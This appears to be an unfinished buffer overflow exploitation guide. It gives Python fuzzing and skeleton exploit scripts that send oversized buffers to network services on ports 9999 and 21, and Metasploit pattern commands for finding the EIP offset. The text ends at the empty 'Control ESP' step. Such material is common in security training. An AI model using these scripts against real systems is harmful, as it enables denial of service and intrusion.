# Steps:
1. Crash The Application
2. Find EIP
3. Control ESP
4. Identify Bad Characters 
5. Find JMP ESP
6. Generate Shell Code
7. Exploit

# 1. Crash the application 
Create a file called fuzz.py The following Python script can be modified and used to fuzz remote entry points to an application. It will send increasingly long buffer strings in the hope that one eventually crashes the application. **Choose one of these versions.**

### Skeleton Version 1

```Python
#!/usr/bin/python 
import socket,sys

ip = '127.0.0.1'
port = 9999
buffer = []

try:
	print '[+] Sending buffer'
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip,port))
	s.recv(1024)			
	s.send(buffer + '\r\n')
except:
 	print '[!] Unable to connect to the application.'
 	sys.exit(0)
finally:
	s.close()
```

### Skeleton Version 2

```Python
    #!/usr/bin/python 
    import socket, time, sys

    ip = "127.0.0.1"
    port = 9999
    timeout = 5

    # Create an array of increasing length buffer strings.
    buffer = []
    counter = 100
    while len(buffer) < 30:
        buffer.append("A" * counter)
        counter += 100

    for string in buffer:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            connect = s.connect((ip, port))
            s.recv(1024)
            s.send("USER username\r\n")
            s.recv(1024)

            print("Fuzzing PASS with %s bytes" % len(string))
            s.send("PASS " + string + "\r\n")
            s.recv(1024)
            s.send("QUIT\r\n")
            s.recv(1024)
            s.close()
        except:
            print("Could not connect to " + ip + ":" + str(port))
            sys.exit(0)
        time.sleep(1)
```

# 2. Find EIP

We are able to establish that we are able to crash the application with a relative number of bytes. Now we need to identify the exact number bytes that it takes to fill the buffer. Metasploit provides a ruby script called pattern_create.rb that will create a unique string with no repeating characters. After we send this payload to the buffer, it will display what the offset is which we'll use for the next step in finding the EIP.

```
$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 666 (Change 666 to the value that crashed the server) 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2...
```

Create a new script called findEIP.py
You take the unique string character created and that becomes your new buffer in findEIP.py 


### Skeleton Version 1

```Python
#!/usr/bin/python 
import socket,sys

ip = '127.0.0.1'
port = 9999
buffer = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2...'

try:
	print '[+] Sending buffer'
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip,port))
	s.recv(1024)			
	s.send(buffer + '\r\n')
except:
 	print '[!] Unable to connect to the application.'
 	sys.exit(0)
finally:
	s.close()
```
### Skeleton Version 2

```Python
#!/usr/bin/python 
import socket

ip = "10.0.0.1"
port = 21

prefix = ""
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2..."
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
```
++++++++++++++++++++++++++++++++++++++++++++
Send that payload to the application, make sure it crashed and grab the EIP value in the debugger.We will now use a second script from Metasploit called pattern_offset.rb. What this script will do is take that value and seeing exactly where it exists in the buffer length we designate, showing us the point where the buffer will crash. 

```
root@gh0x0st:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724134 -l 600
[*] Exact match at offset 524
```
Or you can also use these web generator to find the offset:
1. https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
2. https://wiremask.eu/tools/buffer-overflow-pattern-generator/

### 3. Control ESP


